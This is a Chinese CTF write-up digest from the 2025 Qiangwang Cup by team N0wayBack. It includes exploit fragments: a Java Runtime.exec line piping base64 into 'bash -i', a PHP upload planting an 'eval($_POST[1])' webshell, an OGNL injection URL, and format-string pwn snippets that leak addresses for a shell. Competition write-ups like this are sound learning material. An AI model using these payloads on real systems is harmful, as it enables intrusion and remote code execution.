---
title: 2025 强网杯 WriteUp By N0wayBack（招新+多 pwn/reverse/web）
contest: 2025 强网杯
year: 2025
difficulty: hard
vuln_type: [pwn_unknown, reverse, web_unknown, ssti, deserialize]
tags: [N0wayBack 战队招新 cainyzb@qq.com, Java Runtime.exec bash base64, timestamp[year] PHP 反序列化+文件包含, XSLT TemplatesImpl 内存马, OGNL systemProperties user.home, MMXEncode packed_decrypt (sub-key+rotate+swap), butterfly_mmx_encode, custom VM dumpmem cap+keystone 重定位]
attack_chain:
  - Java 反序列化 XSLT payload → TemplatesImpl 内存马
  - PHP /api.php timestamp[year] 反序列化文件包含
  - OGNL /check?rule=#{#systemProperties['user.home']=='/tmp'}
  - Pwn: %9$p-%12$s 格式化串泄栈 + heap 环境变量拿 shell
  - Reverse: custom VM dumpmem + capstone + keystone 重定位
  - MMXEncode: packed_decrypt = (x - key)→rotate_right_1→swap_2→xor_key
key_payload: "packed_decrypt: x[i]=(x[i]-key[i])&0xff; x=rotate_right_1; swap_2; x[i]^=key[i]"
one_liner: 2025 强网杯 N0wayBack 招新+综合：Java XSLT 内存马 + PHP timestamp 反序列化 + OGNL + 自定义 VM 反编译 + MMXEncode packed_decrypt。
lesson: 自定义 VM 逆向套路 = 0x606AC0 结构体数组 + dfs topo 排序 + capstone/keystone 重定位；MMXEncode packed_decrypt = 减 key → 循环右移 1 → 2 字节交换 → xor key 4 步组合。
quality: high
---

# 2025 强网杯 WriteUp By N0wayBack

> 战队：N0wayBack（招新联系 cainyzb@qq.com）  
> 招新要求：CTF 赛龄 1 年以上、热爱分享、服从管理

## 题目覆盖

### Web 1：Java XSLT + TemplatesImpl 内存马
```java
try { Process process = Runtime.getRuntime().exec("bash -c {echo,Y2F0IC9mbGFnIHwgYmFzZTY0}|{base64,-d}|{bash,-i}"); ...
```
完整 XSLT 反序列化 payload + readObject 触发 TemplatesImpl 加载字节码。

### Web 2：PHP timestamp[year] 反序列化
```
POST /api.php?timestamp[year]=0&timestamp[month]=0&timestamp[day]=0&timestamp[day]$=.php
content=<?php eval($_POST[1]);?>
```
PHP 参数解析数组 + 链式反序列化 + 文件包含。

### Web 3：OGNL
```
/check?rule=%23%7B%23systemProperties%5B%27user.home%27%5D%3D%27%2Ftmp%27%7D
```
OGNL 表达式注入：判断 `user.home` 是否等于 '/tmp'。

### Pwn 1：%9$p-%12$s 格式化串 + heap 拿 shell
```python
sla(b'2.exit', str(1).encode())
sla(b'pay?', b'000000000000255')
sla(b'report:', b'a'*0x100 + b'%9$p-%12$s')
# 泄 libc + heap → system("/bin/sh")
```

### Pwn 2：a'*0x28 token 泄 + tcache 复用
```python
sa(b'token', b'a'*0x28)
c.recvuntil(b'a'*0x28)
addr = u64(c.recvuntil(b'\x2e', True).ljust(8, b'\x00')) - 0xaddae
environ = addr + libc.sym['environ']
```

### Reverse 1：MMXEncode packed_decrypt
```python
def packed_decrypt(x):
    for i in range(8):
        x[i] = (x[i] - key[i]) & 0xff
    x = u64(bytes(x))
    x = ((x >> 1) | (x << 63)) & 0xffff_ffff_ffff_ffff
    x = p64(x)
    x = list(x)
    for i in range(0, 8, 2):
        x[i], x[i+1] = x[i+1], x[i]
    for i in range(8):
        x[i] = x[i] ^ key[i]
    return x
# flag{butter_fly_mmx_encode_7778167}
```
key = b"MMXEncod"，4 步组合：减 key → 循环右移 1 → 2 字节交换 → xor key。

### Reverse 2：自定义 VM（结构体 + dfs 重定位）
```c
struct basic_block_stru_t {
    basic_block_stru_t* false_branch;
    union { basic_block_stru_t* true_branch; void* call_addr; } u;
    int (*basic_block_state_transfer_func)();
    void* basic_block_addr;
};
```
- `0x606AC0` 起每 32 字节一个 basic_block_stru_t
- `dumpmem` GDB 命令 dump 内存 → `capstone` 反汇编
- dfs topo 排序所有 basic block
- `keystone` 重写 jmp/call 跳转并 patch 到 binary
- `recovered.elf` 用 IDA 分析
